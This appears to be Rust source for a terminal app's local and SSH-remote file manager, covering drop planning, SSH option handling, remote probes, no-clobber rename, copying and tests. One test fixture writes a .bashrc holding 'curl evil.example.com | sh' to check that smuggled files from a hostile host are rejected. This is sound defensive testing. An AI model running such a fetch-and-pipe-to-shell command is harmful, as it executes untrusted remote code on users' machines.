pub(crate) fn copy_then_delete(
    copy: impl FnOnce() -> io::Result<()>,
    delete: impl FnOnce() -> io::Result<()>,
) -> io::Result<()> {
    copy()?;
    delete().map_err(|error| {
        io::Error::other(format!(
            "copied, but the source could not be deleted: {error}"
        ))
    })
}

/// Maximum number of top-level items accepted in one drag-and-drop import.
pub(crate) const MAX_DROP_ITEMS: usize = 256;
/// Recursion limit for the drop size walk (matches the copier's depth cap).
const MAX_DROP_WALK_DEPTH: usize = 64;

/// Sum regular-file bytes under `path`, never following symlinks, bounded in
/// depth. Unreadable entries count as zero — the transfer itself reports the
/// real error later; this walk only enforces caps and totals up-front.
pub(crate) fn drop_entry_size(path: &Path, depth: usize) -> u64 {
    let Ok(metadata) = std::fs::symlink_metadata(path) else {
        return 0;
    };
    // `symlink_metadata` does not follow links: a symlinked directory lands
    // in the final branch and contributes nothing — it is never descended.
    if metadata.is_dir() {
        if depth >= MAX_DROP_WALK_DEPTH {
            return 0;
        }
        let Ok(read) = std::fs::read_dir(path) else {
            return 0;
        };
        read.flatten().fold(0_u64, |sum, entry| {
            sum.saturating_add(drop_entry_size(&entry.path(), depth + 1))
        })
    } else if metadata.file_type().is_file() {
        metadata.len()
    } else {
        0
    }
}

/// What to do with one dropped path, and where it lands.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct DropItem {
    pub(crate) src: PathBuf,
    pub(crate) dst: PathBuf,
    pub(crate) is_dir: bool,
    /// Regular-file bytes below `src` (symlinks never followed), used for the
    /// drop-wide cap and for cumulative upload progress.
    pub(crate) size: u64,
    /// `dst` already exists (checked for Local targets; remote targets are
    /// refused atomically by the probe at transfer time instead).
    pub(crate) collides: bool,
}

/// How each item of a drop gets to its destination.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum DropAction {
    /// Tree is local: the existing recursive copier handles each item.
    Copy,
    /// Tree is remote: each item uploads through the transfer machinery.
    Upload,
}

/// The plan for one drag-and-drop import, computed before any work starts so
/// an oversized or malformed drop is refused wholesale with a clear reason.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum DropPlan {
    Import {
        items: Vec<DropItem>,
        action: DropAction,
        total_bytes: u64,
    },
    Refuse(String),
}

/// Plan a drag-and-drop import of local `paths` into `target_dir` on
/// `target`: per-item destination, direction and collision flag, with the
/// whole drop refused when it exceeds the item count or byte caps.
pub(crate) fn plan_drop(paths: &[PathBuf], target: &FsLocation, target_dir: &Path) -> DropPlan {
    if paths.is_empty() {
        return DropPlan::Refuse("Nothing to import.".to_string());
    }
    if paths.len() > MAX_DROP_ITEMS {
        return DropPlan::Refuse(format!(
            "Too many items dropped at once ({MAX_DROP_ITEMS} maximum)."
        ));
    }
    let action = if target.is_remote() {
        DropAction::Upload
    } else {
        DropAction::Copy
    };
    let mut items = Vec::with_capacity(paths.len());
    let mut total_bytes = 0_u64;
    for src in paths {
        if !src.is_absolute() {
            return DropPlan::Refuse("Only absolute local paths can be imported.".to_string());
        }
        let Some(name) = src.file_name() else {
            return DropPlan::Refuse("Cannot import a filesystem root.".to_string());
        };
        let size = drop_entry_size(src, 0);
        total_bytes = total_bytes.saturating_add(size);
        if total_bytes > MAX_TRANSFER_BYTES {
            return DropPlan::Refuse(format!(
                "Dropped items exceed the {} MiB transfer limit.",
                MAX_TRANSFER_BYTES / (1024 * 1024)
            ));
        }
        // A vanished or dangling drop keeps the plan: it fails per-item at
        // execution time and lands in the summary, not in a wholesale refusal.
        let is_dir = std::fs::symlink_metadata(src)
            .map(|metadata| metadata.is_dir())
            .unwrap_or(false);
        let dst = target_dir.join(name);
        let collides = action == DropAction::Copy && std::fs::symlink_metadata(&dst).is_ok();
        items.push(DropItem {
            src: src.clone(),
            dst,
            is_dir,
            size,
            collides,
        });
    }
    DropPlan::Import {
        items,
        action,
        total_bytes,
    }
}

/// Convert the shared, process-observed target into Forge's older launch model
/// and run Forge's stricter final execution gate. Fields unrelated to file
/// probes are deliberately pinned to inert defaults: a temporary Files target
/// never deploys a shell or acquires a resumable session as a side effect.
pub(crate) fn transient_remote_host(target: &RemoteHostConfig) -> io::Result<RemoteHost> {
    target
        .validate()
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    if target.docker {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "an observed SSH target cannot use the Docker transport",
        ));
    }
    let host = RemoteHost {
        name: target.display_name().to_string(),
        host: target.host.clone(),
        user: target.user.clone(),
        docker: false,
        deploy_artifact: None,
        remote_shell: "jsh".to_string(),
        session: None,
        ssh_args: target.ssh_args.clone(),
        login_shell: true,
        multiplex: false,
        deploy: jterm_core::jsh_remote::Deploy::Off,
    };
    crate::config::validate_remote_host(&host)
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    Ok(host)
}

/// Resolve a location against the snapshot of configured hosts taken when the
/// operation was queued. Returning an owned profile keeps the configured and
/// transient paths identical below this authority boundary and avoids lending
/// an index whose meaning a later config reload could change.
fn remote_host(loc: &FsLocation, hosts: &[RemoteHost]) -> io::Result<Option<RemoteHost>> {
    match loc {
        FsLocation::Local => Ok(None),
        FsLocation::Remote(index) => crate::config::checked_remote_host(hosts, *index)
            .cloned()
            .map(Some)
            .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message)),
        FsLocation::Transient(target) => transient_remote_host(target).map(Some),
    }
}

fn ssh_args_without_control_path(args: &[String]) -> io::Result<(Vec<String>, bool)> {
    let mut stable = Vec::with_capacity(args.len());
    let mut removed = false;
    let mut index = 0usize;
    while index < args.len() {
        let argument = &args[index];
        if argument == "-S" {
            if args.get(index + 1).is_none_or(String::is_empty) {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "SSH ControlPath option has no value",
                ));
            }
            removed = true;
            index += 2;
            continue;
        }
        if argument.starts_with("-S") && argument.len() > 2 {
            removed = true;
            index += 1;
            continue;
        }
        if argument == "-o" {
            let option = args.get(index + 1).ok_or_else(|| {
                io::Error::new(io::ErrorKind::InvalidInput, "SSH -o option has no value")
            })?;
            if option
                .split_once('=')
                .map_or(option.as_str(), |(key, _)| key)
                .eq_ignore_ascii_case("controlpath")
            {
                removed = true;
            } else {
                stable.push(argument.clone());
                stable.push(option.clone());
            }
            index += 2;
            continue;
        }
        if let Some(option) = argument.strip_prefix("-o") {
            if option
                .split_once('=')
                .map_or(option, |(key, _)| key)
                .eq_ignore_ascii_case("controlpath")
            {
                removed = true;
                index += 1;
                continue;
            }
        }
        stable.push(argument.clone());
        index += 1;
    }
    Ok((stable, removed))
}

pub(crate) fn stable_ssh_args(args: &[String]) -> io::Result<Vec<String>> {
    ssh_args_without_control_path(args).map(|(stable, _)| stable)
}

fn reusable_control_path_is_safe(path: &str) -> bool {
    Path::new(path).is_absolute()
        && path.len() <= 512
        && !path.chars().any(|character| {
            character.is_whitespace()
                || character.is_control()
                || jterm_core::review_input::is_visual_spoofing_character(character)
        })
}

/// Normalize an observed target into stable identity plus an execution-only
/// SSH option snapshot. Direct `-S` / `-o ControlPath=…` options and Core's
/// provenance-derived jsh socket take the same path, while every other SSH
/// option remains part of identity and must match at execution.
pub(crate) fn observed_target_and_overlay(
    mut target: RemoteHostConfig,
    reusable_control_path: Option<String>,
) -> io::Result<(RemoteHostConfig, FsExecutionOverlay)> {
    let mut execution_args = target.ssh_args.clone();
    let (stable_args, explicit_control_path) = ssh_args_without_control_path(&execution_args)?;
    if let Some(path) = reusable_control_path {
        if explicit_control_path || !reusable_control_path_is_safe(&path) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "the observed SSH control socket cannot be safely reused",
            ));
        }
        execution_args.push("-S".to_string());
        execution_args.push(path);
    }
    target.ssh_args = stable_args;
    target
        .validate()
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    let overlay = if execution_args == target.ssh_args {
        FsExecutionOverlay::default()
    } else {
        FsExecutionOverlay::from_ssh_args(execution_args)
    };
    Ok((target, overlay))
}

/// Resolve stable authority first, then apply transient connection material to
/// the owned execution snapshot. The final Forge execution gate is repeated
/// after the overlay so neither a stale socket path nor argument-budget growth
/// can bypass validation.
fn remote_host_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
) -> io::Result<Option<RemoteHost>> {
    let Some(host) = remote_host(loc, hosts)? else {
        return Ok(None);
    };
    apply_execution_overlay(host, overlay).map(Some)
}

fn apply_execution_overlay(
    mut host: RemoteHost,
    overlay: &FsExecutionOverlay,
) -> io::Result<RemoteHost> {
    if let Some(execution_args) = overlay.ssh_args.as_ref() {
        let stable_host_args = stable_ssh_args(&host.ssh_args)?;
        let (stable_execution_args, has_control_path) =
            ssh_args_without_control_path(execution_args)?;
        if host.docker || !has_control_path || stable_host_args != stable_execution_args {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "the observed SSH control socket cannot be safely reused",
            ));
        }
        host.ssh_args = execution_args.clone();
    }
    crate::config::validate_remote_host(&host)
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    Ok(host)
}

/// Build a plain interactive SSH argv for the temporary Files terminal bridge.
/// There is intentionally no remote command: unlike saved Forge profiles, an
/// observed ad-hoc target must not assume jsh exists on the far side.
pub(crate) fn plain_interactive_ssh_argv(
    target: &RemoteHostConfig,
    overlay: &FsExecutionOverlay,
) -> io::Result<(RemoteHost, Vec<String>)> {
    let host = transient_remote_host(target)?;
    let argv = plain_interactive_ssh_argv_for_host(&host, overlay)?;
    Ok((host, argv))
}

pub(crate) fn plain_interactive_ssh_argv_for_host(
    host: &RemoteHost,
    overlay: &FsExecutionOverlay,
) -> io::Result<Vec<String>> {
    crate::config::validate_remote_host(host)
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    if host.docker {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "plain SSH cannot target a Docker profile",
        ));
    }
    let execution_host = apply_execution_overlay(host.clone(), overlay)?;
    let destination = match &execution_host.user {
        Some(user) => format!("{user}@{}", execution_host.host),
        None => execution_host.host.clone(),
    };
    let mut argv = vec!["ssh".to_string(), "-t".to_string()];
    argv.extend(execution_host.ssh_args.iter().cloned());
    argv.push("--".to_string());
    argv.push(destination);
    Ok(argv)
}

/// Remote probe operands must be absolute UTF-8 paths; anything else is
/// rejected client-side before a connection is even attempted.
fn remote_path_arg(path: &Path) -> io::Result<&str> {
    if !path.is_absolute() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "remote path must be absolute",
        ));
    }
    path.to_str().ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::InvalidInput,
            "remote path is not valid UTF-8",
        )
    })
}

/// What the probe's `stat` op reports for one path.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) struct RemoteStat {
    pub(crate) is_dir: bool,
    /// Byte size for regular files, 0 for directories and symlinks.
    pub(crate) size: u64,
}

fn parse_stat(stdout: &[u8]) -> io::Result<RemoteStat> {
    let text = String::from_utf8_lossy(stdout);
    let mut parts = text.split_whitespace();
    let (Some(kind), Some(size)) = (parts.next(), parts.next()) else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "malformed stat probe output",
        ));
    };
    let is_dir = match kind {
        "d" => true,
        "f" | "l" => false,
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "unknown stat probe type",
            ))
        }
    };
    let size = size
        .parse::<u64>()
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "malformed stat probe size"))?;
    Ok(RemoteStat { is_dir, size })
}

/// Probe `stat` for one path: `Some` when it exists, `None` when missing
/// (exit 3), `Err` for real failures. Used as the friendly pre-flight
/// refusal before streaming; the `put`/`untar` 17 checks remain the atomic
/// enforcement behind it.
fn remote_stat(host: &RemoteHost, path: &Path) -> io::Result<Option<RemoteStat>> {
    let argv = checked_probe_argv(host, "stat", &[remote_path_arg(path)?])?;
    let capture = run_capture(&argv, &[], PROBE_LIST_TIMEOUT, PROBE_HOME_MAX_OUTPUT)?;
    match capture.status {
        0 => parse_stat(&capture.stdout).map(Some),
        3 => Ok(None),
        _ => match probe_result(capture) {
            Err(error) => Err(error),
            Ok(_) => Ok(None),
        },
    }
}

/// Friendly AlreadyExists refusal used by the stat pre-checks.
fn already_exists(path: &Path) -> io::Error {
    io::Error::new(
        io::ErrorKind::AlreadyExists,
        format!("{} already exists", path.display()),
    )
}

/// The directory the tree opens on for a location: the local behavior
/// ($HOME, else `/`) unchanged, or the remote account's home via the probe.
pub(crate) fn start_dir(loc: &FsLocation, hosts: &[RemoteHost]) -> io::Result<PathBuf> {
    start_dir_with_overlay(loc, hosts, &FsExecutionOverlay::default())
}

/// Automatic follow home lookup shares the same token as the first listing.
pub(crate) fn start_dir_with_overlay_cancel(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    cancellation: &CancelToken,
) -> io::Result<PathBuf> {
    if cancellation.is_cancelled() {
        return Err(cancelled_error());
    }
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => Ok(std::env::var_os("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/"))),
        Some(host) => {
            let capture = run_probe_or_cancel(
                &host,
                "home",
                &[],
                PROBE_LIST_TIMEOUT,
                PROBE_HOME_MAX_OUTPUT,
                Some(cancellation),
            )?;
            parse_home(&capture.stdout)
        }
    }
}

pub(crate) fn start_dir_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
) -> io::Result<PathBuf> {
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => Ok(std::env::var_os("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/"))),
        Some(host) => {
            let capture = run_probe(
                &host,
                "home",
                &[],
                PROBE_LIST_TIMEOUT,
                PROBE_HOME_MAX_OUTPUT,
            )?;
            parse_home(&capture.stdout)
        }
    }
}

fn parse_home(stdout: &[u8]) -> io::Result<PathBuf> {
    let line = stdout
        .split(|byte| *byte == b'\n')
        .next()
        .unwrap_or_default();
    if line.is_empty() {
        return Err(io::Error::new(
            io::ErrorKind::NotFound,
            "remote home directory not found",
        ));
    }
    let path = PathBuf::from(std::str::from_utf8(line).map_err(|_| {
        io::Error::new(io::ErrorKind::InvalidData, "remote home is not valid UTF-8")
    })?);
    if !path.is_absolute() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "remote home is not an absolute path",
        ));
    }
    Ok(path)
}

/// List one directory, capped and sorted dirs-first case-insensitively —
/// identical ordering for local and remote so the tree cannot tell them apart.
pub(crate) fn list_dir(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    dir: &Path,
) -> io::Result<FsListing> {
    list_dir_with_overlay(loc, hosts, &FsExecutionOverlay::default(), dir)
}

pub(crate) fn list_dir_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    dir: &Path,
) -> io::Result<FsListing> {
    list_dir_with_overlay_cancel(loc, hosts, overlay, dir, &CancelToken::default())
}

/// Cancellable listing used by the asynchronous file tree. A superseded scan
/// is rejected before local enumeration / subprocess spawn and, for a running
/// remote probe, by the process-group watchdog.
pub(crate) fn list_dir_with_overlay_cancel(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    dir: &Path,
    cancel: &CancelToken,
) -> io::Result<FsListing> {
    if cancel.is_cancelled() {
        return Err(cancelled_error());
    }
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => list_dir_local_cancel(dir, cancel),
        Some(host) => {
            let limit = REMOTE_LIST_PAIR_LIMIT.to_string();
            let capture = run_probe_or_cancel(
                &host,
                "list",
                &[remote_path_arg(dir)?, &limit],
                PROBE_LIST_TIMEOUT,
                PROBE_LIST_MAX_OUTPUT,
                Some(cancel),
            )?;
            Ok(parse_list(&capture.stdout, dir))
        }
    }
}

fn list_dir_local_cancel(dir: &Path, cancel: &CancelToken) -> io::Result<FsListing> {
    if cancel.is_cancelled() {
        return Err(cancelled_error());
    }
    let mut entries = Vec::with_capacity(256);
    let mut truncated = false;
    for entry in std::fs::read_dir(dir)?.flatten() {
        if cancel.is_cancelled() {
            return Err(cancelled_error());
        }
        if entries.len() >= MAX_DIRECTORY_ENTRIES {
            truncated = true;
            break;
        }
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        entries.push(FsEntry {
            name: entry.file_name().to_string_lossy().into_owned(),
            is_dir: file_type.is_dir(),
            path: entry.path(),
        });
    }
    sort_entries(&mut entries);
    Ok(FsListing { entries, truncated })
}

/// Parse `list` wire bytes: NUL-separated `<type>\0<name>\0` pairs. Malformed
/// tails, unknown types, invalid UTF-8 and non-basename paths are skipped.
/// Duplicate names or resolved paths keep only their first valid pair. Wire
/// type `l` always maps to a non-expandable file, including symlinks to dirs.
/// Seeing the requested extra pair marks the retained prefix as truncated.
fn parse_list(bytes: &[u8], dir: &Path) -> FsListing {
    let mut tokens: Vec<&[u8]> = bytes.split(|byte| *byte == 0).collect();
    // The probe terminates every pair with NUL; a final unterminated token
    // means the capture was truncated, so the partial pair is dropped.
    if !bytes.is_empty() && bytes.last() != Some(&0) {
        tokens.pop();
    }
    let mut entries = Vec::new();
    let mut seen_names = std::collections::HashSet::new();
    let mut seen_paths = std::collections::HashSet::new();
    let mut complete_pairs = 0usize;
    // The array chunks exclude a dangling half-pair.
    for pair in tokens
        .as_chunks::<2>()
        .0
        .iter()
        .take(REMOTE_LIST_PAIR_LIMIT)
    {
        complete_pairs += 1;
        if entries.len() >= MAX_DIRECTORY_ENTRIES {
            continue;
        }
        let (kind, name_bytes) = (pair[0], pair[1]);
        let is_dir = match kind {
            b"d" => true,
            b"f" | b"l" => false,
            _ => continue,
        };
        let Ok(name) = std::str::from_utf8(name_bytes) else {
            continue;
        };
        if name.is_empty()
            || name == "."
            || name == ".."
            || name.len() > MAX_ENTRY_NAME_BYTES
            || name.as_bytes().contains(&b'/')
        {
            continue;
        }
        let path = dir.join(name);
        if !seen_names.insert(name.to_string()) || !seen_paths.insert(path.clone()) {
            continue;
        }
        entries.push(FsEntry {
            name: name.to_string(),
            path,
            is_dir,
        });
    }
    sort_entries(&mut entries);
    FsListing {
        entries,
        truncated: complete_pairs >= REMOTE_LIST_PAIR_LIMIT,
    }
}

pub(crate) fn create_dir(loc: &FsLocation, hosts: &[RemoteHost], path: &Path) -> io::Result<()> {
    create_dir_with_overlay(loc, hosts, &FsExecutionOverlay::default(), path)
}

pub(crate) fn create_dir_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    path: &Path,
) -> io::Result<()> {
    match remote_host_with_overlay(loc, hosts, overlay)? {
        // `create_dir` already fails with AlreadyExists when `path` exists.
        None => std::fs::create_dir(path),
        Some(host) => run_probe(
            &host,
            "mkdir",
            &[remote_path_arg(path)?],
            PROBE_OP_TIMEOUT,
            PROBE_OP_MAX_OUTPUT,
        )
        .map(|_| ()),
    }
}

pub(crate) fn create_file(loc: &FsLocation, hosts: &[RemoteHost], path: &Path) -> io::Result<()> {
    create_file_with_overlay(loc, hosts, &FsExecutionOverlay::default(), path)
}

pub(crate) fn create_file_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    path: &Path,
) -> io::Result<()> {
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(path)
            .map(|_| ()),
        Some(host) => run_probe(
            &host,
            "mkfile",
            &[remote_path_arg(path)?],
            PROBE_OP_TIMEOUT,
            PROBE_OP_MAX_OUTPUT,
        )
        .map(|_| ()),
    }
}

pub(crate) fn delete(loc: &FsLocation, hosts: &[RemoteHost], path: &Path) -> io::Result<()> {
    delete_with_overlay(loc, hosts, &FsExecutionOverlay::default(), path)
}

pub(crate) fn delete_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    path: &Path,
) -> io::Result<()> {
    if path == Path::new("/") {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "refusing to delete the filesystem root",
        ));
    }
    match remote_host_with_overlay(loc, hosts, overlay)? {
        // `symlink_metadata` does not follow links: a symlink to a directory
        // takes the `remove_file` branch instead of recursing into its target.
        None => {
            if std::fs::symlink_metadata(path)?.is_dir() {
                std::fs::remove_dir_all(path)
            } else {
                std::fs::remove_file(path)
            }
        }
        Some(host) => run_probe(
            &host,
            "rm",
            &[remote_path_arg(path)?],
            PROBE_OP_TIMEOUT,
            PROBE_OP_MAX_OUTPUT,
        )
        .map(|_| ()),
    }
}

pub(crate) fn rename(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    src: &Path,
    dst: &Path,
) -> io::Result<()> {
    rename_with_overlay(loc, hosts, &FsExecutionOverlay::default(), src, dst)
}

pub(crate) fn rename_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    src: &Path,
    dst: &Path,
) -> io::Result<()> {
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => {
            fail_if_exists(dst)?;
            rename_noreplace(src, dst)
        }
        Some(host) => run_probe(
            &host,
            "mv",
            &[remote_path_arg(src)?, remote_path_arg(dst)?],
            PROBE_OP_TIMEOUT,
            PROBE_OP_MAX_OUTPUT,
        )
        .map(|_| ()),
    }
}

pub(crate) fn copy(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    src: &Path,
    dst: &Path,
) -> io::Result<()> {
    copy_with_overlay(loc, hosts, &FsExecutionOverlay::default(), src, dst)
}

pub(crate) fn copy_with_overlay(
    loc: &FsLocation,
    hosts: &[RemoteHost],
    overlay: &FsExecutionOverlay,
    src: &Path,
    dst: &Path,
) -> io::Result<()> {
    match remote_host_with_overlay(loc, hosts, overlay)? {
        None => {
            fail_if_exists(dst)?;
            copy_recursive(src, dst, 0)
        }
        Some(host) => run_probe(
            &host,
            "cp",
            &[remote_path_arg(src)?, remote_path_arg(dst)?],
            PROBE_OP_TIMEOUT,
            PROBE_OP_MAX_OUTPUT,
        )
        .map(|_| ()),
    }
}

/// `rename`/`copy` must not clobber: probe exit 17 and this check share the
/// AlreadyExists contract. `symlink_metadata` also catches dangling symlinks,
/// which `Path::exists` would miss.
/// Commit a rename that refuses to replace an existing destination, in one
/// namespace operation.
///
/// `fail_if_exists` in front of `std::fs::rename` is a check-then-act: anything
/// created in the window between them is silently destroyed, because
/// `rename(2)` overwrites a destination file without complaint. The pre-check
/// stays as the friendly diagnostic — it produces the message a user reads —
/// but the commit itself has to be authoritative when another process wins the
/// race. anvil made the same move; forge already uses `renameat2` this way for
/// the session snapshot in `crate::state`.
fn rename_noreplace(src: &Path, dst: &Path) -> io::Result<()> {
    #[cfg(target_os = "linux")]
    {
        use std::ffi::CString;
        use std::os::unix::ffi::OsStrExt;

        let src_c = CString::new(src.as_os_str().as_bytes())
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "path contains NUL"))?;
        let dst_c = CString::new(dst.as_os_str().as_bytes())
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "path contains NUL"))?;
        // SAFETY: both names are live for the call and are absolute or relative
        // to the cwd; renameat2 retains no pointers.
        let result = unsafe {
            nix::libc::renameat2(
                nix::libc::AT_FDCWD,
                src_c.as_ptr(),
                nix::libc::AT_FDCWD,
                dst_c.as_ptr(),
                nix::libc::RENAME_NOREPLACE,
            )
        };
        if result == 0 {
            Ok(())
        } else {
            let error = io::Error::last_os_error();
            // A filesystem without RENAME_NOREPLACE support must fail loudly
            // rather than fall back to a replacing rename, which would reopen
            // exactly the hole this closes.
            Err(match error.raw_os_error() {
                Some(nix::libc::ENOSYS) | Some(nix::libc::EINVAL) | Some(nix::libc::EOPNOTSUPP) => {
                    io::Error::new(
                        io::ErrorKind::Unsupported,
                        format!(
                            "{} does not support an atomic no-replace rename",
                            dst.display()
                        ),
                    )
                }
                _ => error,
            })
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        Err(io::Error::new(
            io::ErrorKind::Unsupported,
            "atomic no-replace rename requires Linux",
        ))
    }
}

fn fail_if_exists(path: &Path) -> io::Result<()> {
    match std::fs::symlink_metadata(path) {
        Ok(_) => Err(io::Error::new(
            io::ErrorKind::AlreadyExists,
            format!("{} already exists", path.display()),
        )),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(error) => Err(error),
    }
}

/// Small recursive local copier: directories are recreated entry by entry,
/// symlinks are re-pointed rather than followed, and regular files go through
/// exclusive creation (with source permissions retained). There is deliberately no
/// entry cap here — a user-invoked copy must not silently truncate — but the
/// recursion depth is bounded so a pathological tree fails instead of
/// exhausting the worker stack, and a directory can never be copied into
/// itself (caught canonically at depth 0, so symlink aliases of `src` count).
fn copy_recursive(src: &Path, dst: &Path, depth: usize) -> io::Result<()> {
    if depth >= MAX_COPY_DEPTH {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "directory nesting is too deep to copy",
        ));
    }
    let metadata = std::fs::symlink_metadata(src)?;
    if metadata.is_dir() {
        if depth == 0 {
            // Without this, pasting `/a` into `/a/b` recurses into the copy
            // it is creating until MAX_COPY_DEPTH trips. Canonicalize both
            // sides so a symlinked spelling of `src` cannot sneak past.
            let canonical = src.canonicalize()?;
            let dst_parent = dst
                .parent()
                .map(Path::to_path_buf)
                .unwrap_or_else(|| PathBuf::from("/"))
                .canonicalize()
                .unwrap_or_else(|_| dst.parent().map(Path::to_path_buf).unwrap_or_default());
            if dst_parent
                .join(dst.file_name().unwrap_or_default())
                .starts_with(&canonical)
            {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "cannot copy a directory into itself",
                ));
            }
        }
        std::fs::create_dir(dst)?;
        for entry in std::fs::read_dir(src)? {
            let entry = entry?;
            copy_recursive(&entry.path(), &dst.join(entry.file_name()), depth + 1)?;
        }
        Ok(())
    } else if metadata.file_type().is_symlink() {
        let target = std::fs::read_link(src)?;
        std::os::unix::fs::symlink(target, dst)
    } else if metadata.is_file() {
        use std::os::unix::fs::OpenOptionsExt;
        let mut source = std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(nix::libc::O_NOFOLLOW | nix::libc::O_NONBLOCK)
            .open(src)?;
        if !source.metadata()?.is_file() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "copy source is not a regular file",
            ));
        }
        let mut destination = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(dst)?;
        io::copy(&mut source, &mut destination)?;
        destination.set_permissions(metadata.permissions())
    } else {
        Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "cannot copy a special filesystem entry",
        ))
    }
}

/// Validation shared by the create/rename dialogs and the operations they
/// queue, so a name rejected here can never reach the probe either.
pub(crate) fn validate_new_name(name: &str) -> Result<(), &'static str> {
    if name.is_empty() {
        return Err("Name must not be empty.");
    }
    if name.len() > MAX_ENTRY_NAME_BYTES {
        return Err("Name is too long (255 bytes maximum).");
    }
    if name == "." || name == ".." {
        return Err("Name must not be \".\" or \"..\".");
    }
    if name.contains('/') || name.contains('\0') {
        return Err("Name must not contain '/' or NUL.");
    }
    Ok(())
}

/// Where a paste lands: the source's file name inside the target directory.
pub(crate) fn paste_destination(target_dir: &Path, source: &Path) -> PathBuf {
    match source.file_name() {
        Some(name) => target_dir.join(name),
        // A root source has no file name; pasting it is refused by the caller.
        None => target_dir.to_path_buf(),
    }
}

#[cfg(test)]
mod tests {

    /// The pre-check is a diagnostic, not a guarantee: whatever appears between
    /// it and the rename must not be destroyed. Only the commit can enforce
    /// that, so assert on the commit directly.
    #[test]
    fn rename_noreplace_refuses_an_existing_destination_without_clobbering_it() {
        let root = std::env::temp_dir().join(format!(
            "forge-rename-noreplace-{}-{}",
            std::process::id(),
            line!()
        ));
        std::fs::create_dir_all(&root).unwrap();
        let src = root.join("src");
        let dst = root.join("dst");
        std::fs::write(&src, b"new").unwrap();

        // Absent destination: the commit succeeds.
        super::rename_noreplace(&src, &dst).unwrap();
        assert_eq!(std::fs::read(&dst).unwrap(), b"new");

        // Occupied destination: refused, and the victim survives intact — this
        // is the case a bare `std::fs::rename` overwrites without complaint.
        std::fs::write(&src, b"second").unwrap();
        let error = super::rename_noreplace(&src, &dst).expect_err("must refuse");
        assert!(matches!(
            error.kind(),
            std::io::ErrorKind::AlreadyExists | std::io::ErrorKind::Unsupported
        ));
        assert_eq!(std::fs::read(&dst).unwrap(), b"new");
        assert!(src.exists(), "a refused commit must not consume the source");

        std::fs::remove_dir_all(&root).unwrap();
    }
    use super::*;

    /// A hostile host answering a download of `~/proj` returns `proj/...` and,
    /// beside it, ordinary relative siblings the user's home directory happens
    /// to be full of. Extraction into the target's parent landed every one of
    /// them; extraction into private staging plus this check publishes none.
    #[test]
    fn a_directory_download_publishes_only_the_directory_that_was_asked_for() {
        let root = unique_temp_dir("staging");
        std::fs::create_dir_all(&root).unwrap();
        let expected = std::ffi::OsStr::new("proj");

        let honest = root.join("honest");
        std::fs::create_dir(&honest).unwrap();
        std::fs::create_dir(honest.join("proj")).unwrap();
        std::fs::write(honest.join("proj/main.rs"), b"fn main() {}").unwrap();
        assert_eq!(
            validated_staged_tree(&honest, expected).unwrap(),
            honest.join("proj")
        );

        // The archive carried the requested tree *and* a dotfile beside it.
        let smuggled = root.join("smuggled");
        std::fs::create_dir(&smuggled).unwrap();
        std::fs::create_dir(smuggled.join("proj")).unwrap();
        std::fs::write(smuggled.join(".bashrc"), b"curl evil.example.com | sh\n").unwrap();
        let error = validated_staged_tree(&smuggled, expected).unwrap_err();
